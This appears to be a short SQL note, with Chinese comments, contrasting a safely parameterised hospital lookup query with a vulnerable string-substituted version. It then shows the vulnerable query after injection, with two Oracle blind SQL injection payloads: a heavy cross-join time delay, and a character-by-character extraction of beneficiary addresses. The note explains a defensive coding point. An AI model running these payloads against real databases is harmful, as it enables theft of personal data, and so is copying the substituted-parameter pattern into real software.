/*********************防SQL注入脚本************************************/
SELECT hi.hospital_name

  FROM hospital_information hi

 WHERE hi.is_valid = 'Y'

   AND hi.IS_EXIST_OFFICIAL_WEBSITE = 'Y'

   AND hi.last_invalid_date IS NULL

   AND hi.branch_code

in (select relative_branch_code

                          from branch_code_relation

                         where branch_code = #branchCode#

                           and relative_grade <= 0);

/*****************注入脚本******************************************/
SELECT hi.hospital_name

  FROM hospital_information hi

 WHERE hi.branch_code LIKE '$branchCode$%'

   AND hi.is_valid = 'Y'

   AND hi.IS_EXIST_OFFICIAL_WEBSITE = 'Y'

   AND hi.last_invalid_date IS NULL

由于branchCode参数被SQL注入后，语句会变成：

SELECT hi.hospital_name

  FROM hospital_information hi

 WHERE hi.branch_code LIKE '88952634'

   AND 3823 = (SELECT COUNT (*)

                     FROM ALL_USERS T1,

                          ALL_USERS T2,

                          ALL_USERS T3,

                          ALL_USERS T4,

                          ALL_USERS T5)

   AND 'Ahea' LIKE 'Ahea%'

   AND hi.is_valid = 'Y'

   AND hi.IS_EXIST_OFFICIAL_WEBSITE = 'Y'

   AND hi.last_invalid_date IS NULL

/**********************2*****************************/

SELECT hi.hospital_name

  FROM hospital_information hi

WHERE     hi.branch_code LIKE '88952634'

       AND 8808 = (CASE

                      WHEN (ASCII (

                               SUBSTRC (

                                  (SELECT NVL (

                                             CAST (

                                                ENTRY_VALUE AS VARCHAR (4000)),

                                             CHR (32))

                                     FROM (SELECT ADDRESS AS ENTRY_VALUE,

                                                  ROWNUM AS LIMIT

                                             FROM PUBDATA.BENEFICIARY_INFO)

                                    WHERE LIMIT = 1),

                                  1,

                                  1)) > 1)

                      THEN

                         (SELECT COUNT (*)

                            FROM ALL_USERS T1,

                                 ALL_USERS T2,

                                 ALL_USERS T3,

                                 ALL_USERS T4,

                                 ALL_USERS T5)

                      ELSE

                         8808

                   END)

       AND 'bkhQ' LIKE 'bkhQ%'

       AND hi.is_valid = 'Y'

       AND hi.IS_EXIST_OFFICIAL_WEBSITE = 'Y'

       AND hi.last_invalid_date IS NULL
